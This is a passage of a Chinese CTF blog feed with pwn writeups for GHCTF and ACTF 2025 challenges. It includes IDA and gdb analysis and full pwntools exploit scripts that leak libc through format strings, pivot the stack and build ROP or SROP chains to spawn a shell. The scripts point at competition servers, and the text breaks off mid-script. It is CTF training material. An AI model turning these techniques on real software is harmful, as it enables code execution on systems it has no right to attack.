IP:&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;set your SP:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;execve:&quot;</span>,<span class="built_in">str</span>(<span class="number">14</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### Code </span></span><br><span class="line">Code(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>)   <span class="comment">#reg[0]=8</span></span><br><span class="line">Code(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">Code(<span class="number">0x50</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>)   <span class="comment">#reg[1]=-8</span></span><br><span class="line">Code(<span class="number">0x10</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">7</span>)   <span class="comment">#reg[2]=7</span></span><br><span class="line">Code(<span class="number">0x10</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">4</span>)   <span class="comment">#reg[4]=4</span></span><br><span class="line">Code(<span class="number">0x80</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>)   <span class="comment">#reg[3]=0x70</span></span><br><span class="line">Code(<span class="number">0x40</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>)   <span class="comment">#reg[3]=0x77</span></span><br><span class="line"><span class="comment">### backdoor  </span></span><br><span class="line">Code(<span class="number">0x80</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>)   <span class="comment">#reg[4]=0x40</span></span><br><span class="line">Code(<span class="number">0x80</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">0</span>)   <span class="comment">#reg[4]=0x4000</span></span><br><span class="line">Code(<span class="number">0x80</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">0</span>)   <span class="comment">#reg[4]=0x400000</span></span><br><span class="line">Code(<span class="number">0x80</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)   <span class="comment">#reg[0]=0x800</span></span><br><span class="line">Code(<span class="number">0x40</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>)   <span class="comment">#reg[0]=0x877</span></span><br><span class="line">Code(<span class="number">0x40</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">0</span>)   <span class="comment">#reg[4]=0x400877</span></span><br><span class="line">Code(<span class="number">0x90</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="GHCTF-ret2libc2"><a href="#GHCTF-ret2libc2" class="headerlink" title="GHCTF ret2libc2"></a>GHCTF ret2libc2</h1><h2 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h2><h3 id="func函数分析"><a href="#func函数分析" class="headerlink" title="func函数分析"></a>func函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/98a456adebe8adb789ba9ca00f26a510.png" alt="98a456adebe8adb789ba9ca00f26a510"><br>1.程序很简单,main函数里只有init和func，这里直接看到func函数<br>2.可以看到存在一个格式化字符串漏洞和溢出漏洞.<br>3.程序没有提供system和<code>/bin/sh\x00</code>，需要泄露libc，完成ret2libc.</p><h3 id="func汇编分析"><a href="#func汇编分析" class="headerlink" title="func汇编分析"></a>func汇编分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/98a456adebe8adb789ba9ca00f26a510.png" alt="98a456adebe8adb789ba9ca00f26a510"><br>1.从汇编中可以看到更多信息.<br>2.首先是在leave ret 之前，lea rax [rbp+buf]. 实际上是将我们的输入的起始位置的内容交给了rax.而且可以注意到，无论是printf还是两个puts，都是通过rax来设置rdi。那么也就说我们的输入，可以给printf传递参数，也就是可以实现我们的格式化字符串漏洞.<br>3.同时，leave ret 留下了栈迁移的隐患。</p><h3 id="gdb调试分析"><a href="#gdb调试分析" class="headerlink" title="gdb调试分析"></a>gdb调试分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/65dadea8bb2e5a40f2a81d8411fea262_720.png" alt="65dadea8bb2e5a40f2a81d8411fea262.png"><br>1.通过gdb动调寻找栈上可以泄露出libc的函数.将func的返回地址覆盖为0x401227，直接将printf的rdi修改成我们的输入，查看这一帧栈帧，在0x15的位置看到了__libc_start_main,计算偏移为21+6&#x3D;27.<br>2.同时，在第一次溢出时，需要覆盖rbp为有效地址。否则，这次func执行最后，会崩溃掉。</p><h2 id="构造思路-1"><a href="#构造思路-1" class="headerlink" title="构造思路"></a>构造思路</h2><p>1.首先确定泄露libc的手段，格式化字符串.并且第一次溢出时需要栈迁移.在这里补充一点，除了使用格式化字符串以外，还有一种泄露的手法.观察func函数，0x401223处，会将rbp-0x10 的内容作为参数赋给rax，再下方又被赋给了rdi.那么如果[rbp-0x10]是某个got表，那就可以把got表的内容打印出来。所以我们只需要把某个got-0x10交给rbp，就可以完成第一次的栈迁移和libc的泄露。<br>2.因为程序本身是没有提供pop_rdi,但是题目给了libc.so.6文件，在泄露libc基址之后，利用libc.so.6中的pop rdi;ret，一样可以控制rdi寄存器。现在我们已经有了ret2libc的全部条件。只需要栈迁移的一个合适的地址，完成rop。<br>3.选择bss段的高地址完成这段rop。如果是采用第二种方法泄露libc的话，需要再栈迁移一次，而且为了保证程序的顺利执行，第二次溢出，需要注意维护got表的内容尤其是read，否则第三次溢出就会出错。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">io=process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#io=remote(&quot;node2.anna.nssctf.cn&quot;,28626)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">bss=<span class="number">0x404060</span></span><br><span class="line">ret=<span class="number">0x4011fa</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;%27$p&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload1=payload1.ljust(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(bss+<span class="number">0x900</span>)+p64(<span class="number">0x401227</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;show your magic\n&#x27;</span>,payload1)</span><br><span class="line">start_addr=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">128</span></span><br><span class="line">libc_base=start_addr-libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;start_addr-&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(start_addr)))</span><br><span class="line">pop_rdi=libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">one=libc_base+<span class="number">0xebc85</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x38</span>)+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;show your magic\n&#x27;</span>,payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="迁移泄露"><a href="#迁移泄露" class="headerlink" title="迁移泄露"></a>迁移泄露</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">mode=<span class="number">1</span></span><br><span class="line">url=<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span></span><br><span class="line">port=<span class="number">28268</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> mode == <span class="number">0</span>:</span><br><span class="line">    io=process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    io=remote(url,port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#leave_ret=0x</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">complete=<span class="number">0x404070</span></span><br><span class="line">func=<span class="number">0x40121f</span></span><br><span class="line">magic=<span class="number">0x401252</span></span><br><span class="line">bss=elf.bss()+<span class="number">0x500</span>+<span class="number">0x500</span></span><br><span class="line">rsp_8=<span class="number">0x401016</span></span><br><span class="line">offset=<span class="number">0x30</span>+<span class="number">8</span></span><br><span class="line">payload=<span class="string">b&#x27;%13$s&#x27;</span>.ljust(<span class="number">0x30</span>,<span class="string">b&#x27;\x61&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x404038</span>)</span><br><span class="line">payload+=p64(func)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">io.sendafter(<span class="string">&quot;show your magic\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">read=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;read-&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read)))</span><br><span class="line"></span><br><span class="line">libc_base=read-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sys=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">puts=libc_base+libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf=libc_base+libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">setvbuf=libc_base+libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">bin_sh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">pop_rdi=libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">ret=libc_base+<span class="number">0x29139</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(puts)+p64(printf)+p64(read)+p64(setvbuf)</span><br><span class="line">payload+=p64(bss)+p64(magic)</span><br><span class="line">io.sendafter(<span class="string">&quot;show your magic\n&quot;</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">payload=offset * <span class="string">b&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(bin_sh)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(sys)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="GHCTF-你真的会布置栈吗？"><a href="#GHCTF-你真的会布置栈吗？" class="headerlink" title="GHCTF 你真的会布置栈吗？"></a>GHCTF 你真的会布置栈吗？</h1><h2 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h2><h3 id="start函数分析"><a href="#start函数分析" class="headerlink" title="start函数分析"></a>start函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/813b6b639a05fd8870ff80b5be117df7.png" alt="813b6b639a05fd8870ff80b5be117df7"></p><p>1.print了两段字符，然后调用sys_read()读取数据，溢出空间非常大<br>2.最后，不是leave ret，而是jmp rsp，var8 是 qword ptr -8  ，可以从汇编代码查看</p><h3 id="print函数分析"><a href="#print函数分析" class="headerlink" title="print函数分析"></a>print函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/a36c17d8abe90bc1a9920db0595e982d.png" alt="a36c17d8abe90bc1a9920db0595e982d"><br>1.print是通过sys_wirte()，实现写字符，最后也是jmp rsp.</p><h3 id="gadgets-分析"><a href="#gadgets-分析" class="headerlink" title="gadgets 分析"></a>gadgets 分析</h3><p>1.gadgets都已经在上面的图中，可以看到，我们能直接控制的有rsi,rdi,rbx,r13,r15，最后还会jmp r15.<br>2.从print的汇编中可以看到，可以交换rax和r13 的值，因此可以间接控制rax.<br>3.同时，dispatch留有执行rbx中代码的功能.<br>4.下方还可以控制rdx，rsi，rdi 值为0.</p><h2 id="构造思路-2"><a href="#构造思路-2" class="headerlink" title="构造思路"></a>构造思路</h2><p>1.首先，在_start 函数中有很明显的溢出漏洞，并且通过jmp rsp 可以跳转到我们写入的地址。第一眼，考虑shellcode ，但是一下就可以排除。因为它不会执行shellcode，而是跳转地址。因为题目只有系统调用的函数，所以肯定是用syscall解题。<br>2.确定是用syscall写题之后，考虑要控制的寄存器。首先execve函数的系统调用号是0x3b，需要设置rax&#x3D;0x3b，可以通过r13 和 <code>xchg rax，r13</code> 实现，接着是rsi 设置为0 ，rdx 设置为0 ，rdi设置为，<code>&quot;/bin/sh\x00&quot;</code> 的地址。但是程序中没有该字符串，所以需要，先调用一次read往程序上写入字符串。<br>3.read函数，需要控制rax&#x3D;0，rsi为buf，即写入的地址，rdx为写入字符数。可以利用gadgets 设置rsi 完成任意地址写，利用本身的sys_read 设置字节为0x539。因为程序没有bss段，所以只能往data段上写入字符。<br>4.那么目前的思路就是，利用sys_read往data段写入字符，再执行execve，getshell<br>5.但是似乎忽略了一点。rdx，本身是0x539，我们没有修改，需要通过xor_rdx 来修改为0 ，但是这条指令进跟着的是jmp r15.意味着，我们不能设置r15 为xor_rdx。 考虑让r15 指向xchg rax，r13，将rsp 设置为xor_rdx,也陷入了循环。似乎无法跳出循环。<br>6.此时注意到dispatch,可以跳转到rbx中的指令，而且每次执行会加8，也就是可以执行下一条指令。这样一来，我们把r15 指向dispatch，同时设置rbx为之前sys_read时，buf的地址.然后，之前sys_read时在buf 里依次布置指令，xor_rdx，xchg rax,r13 的地址。这样，将rdx置0 后，程序会跳转到xchg rax，r13 ，将rax 设置为r13的值.最后将rsp 设置为，syscall，就可以完成这华丽的rop。</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><h3 id="花里胡哨的rop"><a href="#花里胡哨的rop" class="headerlink" title="花里胡哨的rop"></a>花里胡哨的rop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">mode=<span class="number">1</span></span><br><span class="line">url=<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span></span><br><span class="line">port=<span class="number">28634</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./attachment&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> mode == <span class="number">0</span>:</span><br><span class="line">    io=process(<span class="string">&quot;./attachment&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    io=remote(url,port)</span><br><span class="line"></span><br><span class="line">sys_call=<span class="number">0x401077</span></span><br><span class="line">rax_r13=<span class="number">0x40100c</span></span><br><span class="line">data=<span class="number">0x402000</span></span><br><span class="line">gadget_pop=<span class="number">0x401017</span></span><br><span class="line">dispatcher=<span class="number">0x401011</span></span><br><span class="line">xor_rsi=<span class="number">0x401027</span></span><br><span class="line">Free_Gate=<span class="number">0x40101c</span></span><br><span class="line">xor_rdx=<span class="number">0x401021</span></span><br><span class="line"></span><br><span class="line">payload=p64(gadget_pop)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(gadget_pop) <span class="comment">#r15</span></span><br><span class="line">payload+=p64(data) <span class="comment">#rsi ,rsp</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment">#rdi,rbx,r13</span></span><br><span class="line">payload+=p64(rax_r13) <span class="comment">#r15 </span></span><br><span class="line">payload+=p64(Free_Gate)</span><br><span class="line">payload+=p64(sys_call) <span class="comment">#r15   read</span></span><br><span class="line"></span><br><span class="line">payload+=p64(gadget_pop)<span class="comment"># rsp,rsi</span></span><br><span class="line">payload+=p64(data)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment"># rdi,rbx,r13</span></span><br><span class="line">payload+=p64(gadget_pop)<span class="comment"># r15</span></span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment"># rsp,rsi</span></span><br><span class="line">payload+=p64(data)+p64(data)+p64(<span class="number">0x3b</span>) <span class="comment"># rdi,rbx,r13</span></span><br><span class="line">payload+=p64(dispatcher)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(sys_call)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload+=p64(xor_rdx)+p64(rax_r13)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 新生赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF-2025-pwn</title>
      <link href="/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/ACTF-2025-pwn/"/>
      <url>/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/ACTF-2025-pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="ACTF-2025-pwn"><a href="#ACTF-2025-pwn" class="headerlink" title="ACTF-2025-pwn"></a>ACTF-2025-pwn</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续备战</p><h2 id="only-read"><a href="#only-read" class="headerlink" title="only_read"></a>only_read</h2><p>题如其名，只有一个read 函数，通过magic gadgets 来打。当然也有其他解法</p><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h4 id="magic-gadgets"><a href="#magic-gadgets" class="headerlink" title="magic gadgets"></a>magic gadgets</h4><p>首先要知道经典的gadgets</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x000000000040111c</span> : add dword ptr [rbp - <span class="number">0x3d</span>], ebx ; nop ; ret</span><br><span class="line"><span class="number">0x0000000000110a46</span>: pop rbx; pop rbp; pop r12; pop r13; pop r14;</span><br></pre></td></tr></table></figure><p>这两条gadgets，可以凑一个任意半个地址写。上面那个是程序里的，下面的是libc中的。选择这条是因为它的低三字节和read接近，只需要改两个字节，就可以把read修改为这个。（ps：4,5,6都是说第二次read时的payload）</p><ol><li>那么第一次read，就是修改rbp，然后返回read继续读。</li><li>第二次read，前面0x80字节开始为后续的利用作准备。rbp设置为，这次的读入的地址，同时，这地址要下一次能修改到read@got[]</li><li>第三次read，就修改掉read@got为0x110a46 这条gadget</li><li>read结束之后，rsp指向rbp+8，rbp是之前设计好的，也就是会回到第二次read时的前0x80字节之间。在这里调用read@plt，来执行改好的gadget。这时可以控制rbx，rbp。</li><li>然后，接上0x40111c这条gadget，把read@got[]改为ogg。</li><li>然后，可以接一个pop_rbp抬栈，再调用read@plt，来执行ogg。</li></ol><h4 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h4><p>如何找syscall; ret;</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc.so.6 --opcode 0f05c3</span><br></pre></td></tr></table></figure><p>这是找syscall的一个方法。当然read函数的过程中其实有syscall，我们只要把偏移改过去就行。当然要提前控制好<code>rax</code>, 那么这题就是要想办法控制<code>rax</code>为<code>0xf</code></p><ol><li>第一次read，修改rbp，返回read继续读。</li><li>第二次read，前0x80字节可以部署一些准备工作，rbp往bss的高地址写，便于控制。</li><li>第三次read，要控制rbp，为read@got[]附近，下一次要修改read偏移直接到sysread。同时把SigreturnFrame，部署在这里。</li><li>第四次read，把偏移改好</li><li>这一次，因为没有设置好rax，所以还是read，随便输下一次就是SROP。</li></ol><h4 id="nepnep"><a href="#nepnep" class="headerlink" title="nepnep"></a>nepnep</h4><p><a href="https://cn-sec.com/archives/4011487.html">ACTF 2025 Writeup by Nepnep | CN-SEC 中文网</a></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><h4 id="magic-gadgets-1"><a href="#magic-gadgets-1" class="headerlink" title="magic gadgets"></a>magic gadgets</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;66%&#x27;</span>]</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">io,elf=loadfile(<span class="string">&quot;./only_read&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span></span><br><span class="line"><span class="string">0x0000000000058aa8 : pop rbp ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x00000000000584d5 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span></span><br><span class="line"><span class="string">0x0000000000110a46: pop rbx; pop rbp; pop r12; pop r13; pop r14; ret;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">one_gadgets=[<span class="number">0xef52b</span>,<span class="number">0xef4ce</span>,<span class="number">0x583f3</span>,<span class="number">0x583ec</span>]</span><br><span class="line">gdb.attach(io,<span class="string">&quot;b *0x401158&quot;</span>)</span><br><span class="line">got_read = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">addr_reread = <span class="number">0x401142</span></span><br><span class="line">gadget=[<span class="number">0x40111c</span>,<span class="number">0x058aa8</span>,<span class="number">0x0584d5</span>]</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x80</span>+p64(got_read+<span class="number">0x100</span>)+p64(addr_reread)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">rop_chain = <span class="string">b&quot;1&quot;</span> * <span class="number">8</span></span><br><span class="line">rop_chain += flat([</span><br><span class="line">    elf.plt[<span class="string">&#x27;read&#x27;</span>],</span><br><span class="line">    <span class="number">0xfffdeae5</span>, <span class="comment"># 修改read@got 为 ogg</span></span><br><span class="line">    got_read + <span class="number">0x3d</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    gadget[<span class="number">0</span>]</span><br><span class="line">], length=<span class="number">0x38</span>)</span><br><span class="line">rop_chain += p64(gadget[<span class="number">0</span>]+<span class="number">1</span>)</span><br><span class="line">rop_chain += p64(<span class="number">0x404190</span>)</span><br><span class="line">rop_chain += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop_chain = rop_chain.ljust(<span class="number">0x80</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">rop_chain += p64(<span class="number">0x403ff8</span> + <span class="number">0x88</span>)</span><br><span class="line">rop_chain += p64(addr_reread)</span><br><span class="line">io.sendline(rop_chain)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.send(<span class="string">b&quot;\x46\x0a&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="SROP-1"><a href="#SROP-1" class="headerlink" title="SROP"></a>SROP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 